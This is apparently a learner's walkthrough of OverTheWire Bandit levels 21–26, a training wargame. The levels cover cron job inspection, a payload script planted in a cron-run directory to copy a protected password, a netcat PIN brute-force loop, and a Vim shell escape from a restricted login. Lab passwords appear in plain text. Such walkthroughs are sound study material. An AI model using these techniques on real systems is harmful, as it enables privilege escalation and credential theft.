# OverTheWire Bandit Levels 21–26

## Objective
Continue developing Linux administration, networking, scripting, and privilege escalation skills through the OverTheWire Bandit wargame.

---

# Level 21

## Goal
Retrieve the password for `bandit22` by investigating an automated cron job.

## Commands Used
```bash
cat /etc/cron.d/cronjob_bandit22
```

```bash
cat /usr/bin/cronjob_bandit22.sh
```

```bash
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

## What I Learned
- Investigating cron jobs
- Tracing automated script execution
- Understanding scheduled Linux tasks
- Inspecting temporary file usage

## Challenges
The challenge required inspecting a cron job running as `bandit22`.

First, I inspected the cron configuration:

```bash
cat /etc/cron.d/cronjob_bandit22
```

which revealed the script being executed:

```text
/usr/bin/cronjob_bandit22.sh
```

Inspecting the script showed that it copied the password file into a temporary file located in `/tmp`.

By reading the generated temporary file:

```bash
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

I was able to retrieve the password for the next level.

## Cybersecurity Relevance
This level introduced:
- cron job investigation
- automation tracing
- scheduled task auditing
- temporary file analysis

---

# Level 22

## Goal
Retrieve the password for `bandit23` by understanding how the cron script generates a predictable temporary filename.

## Commands Used
```bash
cat /etc/cron.d/cronjob_bandit23
```

```bash
cat /usr/bin/cronjob_bandit23.sh
```

```bash
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
```

## What I Learned
- Understanding execution context in scripts
- Using `md5sum`
- Predicting temporary file paths
- Investigating Linux automation logic

## Challenges
This level required investigating another cron job related to `bandit23`.

The script:
- generated an MD5 hash using the username,
- used the hash as the filename inside `/tmp`,
- copied the password into that predictable file.

The important detail was realizing the script runs as:

```text
bandit23
```

not:
```text
bandit22
```

Using:

```bash
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
```

generated the filename:

```text
8ca319486bfbbc3663ea0fbe81326349
```

which contained the password for the next level.

## Cybersecurity Relevance
This level demonstrated:
- predictable temporary-file vulnerabilities
- automation weaknesses
- script auditing
- privilege separation concepts

---

# Level 23

## Goal
Retrieve the password for `bandit24` by abusing an automated cron execution directory.

## Commands Used
```bash
cat /etc/cron.d/cronjob_bandit24
```

```bash
cat /usr/bin/cronjob_bandit24.sh
```

```bash
cp /tmp/myscript.sh /var/spool/bandit24/foo
```

## Payload Script
```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/mypassword
chmod 644 /tmp/mypassword
```

## What I Learned
- Cron-based code execution
- Automated script execution
- Linux privilege escalation concepts
- Temporary file exfiltration

## Challenges
The cron job executed every script inside:

```text
/var/spool/bandit24/foo
```

as:
```text
bandit24
```

I created my own script that copied the protected password into `/tmp`, placed it inside the watched directory, and waited for the cron job to execute it automatically.

After execution, I retrieved the password from the generated temporary file.

## Cybersecurity Relevance
This level demonstrated:
- cron abuse
- scheduled task exploitation
- privilege escalation
- automated code execution
- writable execution directory risks

---

# Level 24

## Goal
Retrieve the password for `bandit25` by brute forcing a 4-digit PIN against a listening daemon.

## Commands Used
```bash
nc localhost 30002
```

## Bash Automation Script
```bash
#!/bin/bash

bandit="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for pin in {0000..9999}; do
    echo "$bandit $pin"
done | nc -q 1 localhost 30002
```

## What I Learned
- Bash scripting
- Brute-force automation
- Using loops in Linux
- Network interaction using Netcat
- Automating repetitive tasks

## Challenges
The daemon on port `30002` required:
- the current password,
- followed by a 4-digit PIN.

Since manually testing all combinations would be inefficient, I created a bash script that:
- generated every PIN from `0000-9999`,
- sent each PIN together with the current password,
- interacted with the daemon automatically through Netcat.

The correct PIN returned the password for the next level.

## Cybersecurity Relevance
This level introduced:
- brute-force methodology
- offensive automation
- credential attacks
- shell scripting
- automated network interaction

---

# Level 25

## Goal
Access the next level using the provided SSH private key.

## Commands Used
```bash
scp -P 2220 bandit26.sshkey USER@IP:path
```

```bash
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
```

## What I Learned
- Secure file transfer using SCP
- SSH private-key authentication
- Remote authentication workflows

## Challenges
This level required transferring and using a private SSH key in order to authenticate as the next user.

Using:
```bash
scp
```

I transferred the private key and authenticated with:

```bash
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
```

## Cybersecurity Relevance
This level demonstrated:
- SSH authentication
- private-key usage
- secure remote access
- remote credential management

---

# Level 26

## Goal
Escape the restricted shell environment and retrieve the password for `bandit27`.

## Commands Used
```vim
:set shell=/bin/bash
```

```vim
:shell
```

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

## What I Learned
- Escaping restricted shell environments
- Pager and editor escape techniques
- Using Vim to spawn interactive shells
- Linux privilege escalation concepts

## Challenges
The shell immediately disconnected after login due to a restricted environment.

By shrinking the terminal window, the login banner triggered the Linux `more` pager. From there, pressing:

```text
v
```

opened Vim.

Inside Vim, I executed:

```vim
:set shell=/bin/bash
```

followed by:

```vim
:shell
```

to spawn an interactive bash shell.

Once inside the shell, I used the provided binary:

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

to retrieve the password for the next level.

## Cybersecurity Relevance
This level demonstrated:
- restricted shell bypassing
- pager escapes
- Vim shell escapes
- privilege escalation
- Unix environment abuse techniques

These are real-world techniques sometimes used during:
- penetration testing
- restricted shell environments
- Linux privilege escalation scenarios.
